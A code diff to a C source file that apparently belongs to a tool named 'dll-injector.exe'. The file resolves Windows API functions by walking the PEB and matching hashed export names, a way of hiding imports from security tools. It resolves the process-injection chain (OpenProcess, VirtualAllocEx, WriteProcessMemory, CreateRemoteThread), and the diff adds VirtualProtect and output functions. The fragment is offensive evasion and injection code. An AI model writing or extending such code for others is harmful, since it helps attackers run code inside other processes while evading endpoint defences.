@@ -8,14 +8,13 @@
  * Build: compiled as part of dll-injector.exe (see Makefile).
  */
 
-#include "utils/peb-lookup.h"
+#include <peb-lookup.h>
 #include <stdint.h>
 
 /* ============================================================================
  * Global API Table
  * ========================================================================= */
-
-DYNAMIC_APIS g_Api = {0};
+DYNAMIC_APIS  g_Api = {0};
 
 /* ============================================================================
  * FNV-1a Hash Functions
@@ -205,7 +204,7 @@ FARPROC GetExportAddress_Hashed(HMODULE hMod, DWORD functionHash) {
  * To generate a hash, use the Python snippet in peb-lookup.h's header comment.
  * ========================================================================= */
 
-bool InitDynamicAPIs(void) {
+DYNAMIC_APIS * InitDynamicAPIs(void) {
     /* Step 1: Resolve kernel32.dll base address via PEB walk */
     HMODULE hKernel32 = GetModuleBase_Hashed(HASH_KERNEL32_DLL);
     if (hKernel32 == NULL)
@@ -229,10 +228,13 @@ bool InitDynamicAPIs(void) {
     /* Process manipulation APIs */
     RESOLVE(fnOpenProcess,              pOpenProcess,               HASH_OpenProcess);
     RESOLVE(fnVirtualAllocEx,           pVirtualAllocEx,            HASH_VirtualAllocEx);
+    RESOLVE(fnVirtualProtect,           pVirtualProtect,            HASH_VirtualProtect);
     RESOLVE(fnWriteProcessMemory,       pWriteProcessMemory,        HASH_WriteProcessMemory);
     RESOLVE(fnCreateRemoteThread,       pCreateRemoteThread,        HASH_CreateRemoteThread);
     RESOLVE(fnVirtualFreeEx,            pVirtualFreeEx,             HASH_VirtualFreeEx);
     RESOLVE(fnCloseHandle,              pCloseHandle,               HASH_CloseHandle);
+    RESOLVE(fnGetStdHandle,             pGetStdHandle,              HASH_GetStdHandle);
+    RESOLVE(fnWriteFile,                pWriteFile,                 HASH_WriteFile);
 
     /* Process enumeration APIs */
     RESOLVE(fnCreateToolhelp32Snapshot, pCreateToolhelp32Snapshot,  HASH_CreateToolhelp32Snapshot);
@@ -245,5 +247,5 @@ bool InitDynamicAPIs(void) {
 
     #undef RESOLVE
 
-    return true;
+    return &g_Api;
 }
